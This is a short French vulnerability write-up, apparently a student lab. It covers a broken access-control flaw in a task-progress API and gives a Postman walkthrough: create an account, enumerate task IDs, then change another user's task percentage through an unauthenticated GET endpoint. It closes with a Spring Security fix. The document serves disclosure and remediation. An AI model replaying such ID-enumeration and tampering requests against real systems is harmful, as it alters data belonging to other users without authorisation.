# Faille
Une faille de sécurité concernant le contrôle d’accès sur la mise a jours du pourcentage d’une tache est exploitable.

# Exploit
1. Pirate crée un compte avec Postman en utilisant la requête POST http://llbinfd060400:8080/api/id/signup, avec un corps de requête contenant les paramètres "username" et "password".
Exemple:
    Corp de requête:
        {
            "username": "pirate",
            "password": "P@ss"
        }

2. Pirate se connecte avec Postman au compte créé à l’étape précédente en utilisant la requête POST http://llbinfd060400:8080/api/id/signin, avec un corps de requête contenant les paramètres "username" et "password".
Exemple:
    Corp de requête: 
        {
            "username": "pirate",
            "password": "P@ss"
        } 

3. Pirate utilise Postman pour rechercher l’ID de la tâche qu’il souhaite modifier en modifiant l’ID dans la requête GET http://llbinfd060400:8080/api/detail/{id}. Il examine ensuite le corps de la réponse reçue.
Exemple:
    Requête: 
        GET http://llbinfd060400:8080/api/detail/14

    Corps recus:
        {
            "id": 14,
            "name": "Tache pour l'etudiant au poste 20",
            "deadline": "2024-06-24T16:27:46",
            "events": [],
            "percentageDone": 0,
            "percentageTimeSpent": 0.0
        }

4. Pirate utilise Postman pour modifier la "valeur" de la tâche dont il a trouvé l’ID à l’étape précédente. Il envoie une requête GET http://LLBINFD060400:8080/api/progress/{id}/{valeur}.
Exemple:
    GET http://LLBINFD060400:8080/api/progress/14/73

5. Pirate peut confirmer l’enregistrement du changement en consultant à nouveau les détails de la tâche avec la requête GET http://llbinfd060400:8080/api/detail/{id}.
Exemple:
    Requête: 
        GET http://llbinfd060400:8080/api/detail/14

    Corps recus:
        {
            "id": 14,
            "name": "Tache pour l'etudiant au poste 20",
            "deadline": "2024-06-24T16:27:46",
            "events": [
                {
                    "value": 73,
                    "timestamp": "2024-04-30T12:43:49"
                },
            ],
            "percentageDone": 73,
            "percentageTimeSpent": 0.0
        }

# Correctif
Cette faille se corrige en 4 étapes:

1. Spring Security : Mettez en place la bibliothèque Spring Security pour garantir que les utilisateurs ne peuvent pas accéder à n’importe quelle ressource.

2. Authentification : Utilisez Spring Security pour gérer l’authentification.

3. Extraction de l’utilisateur authentifié actuel : Ajoutez un paramètre de service pour récupérer l’utilisateur actuellement authentifié. Vérifiez avec une méthode que c’est bien lui qui modifie la tâche. 
Exemple:
    private MUtilisateur utilisateurActuel() {
        UserDetails ud = (UserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        MUtilisateur utilisateur = service.utilisateurParSonNom(ud.getUsername());
        return utilisateur;
    }

4. Test de propriété : Assurez-vous que les propriétés sont correctement vérifiées.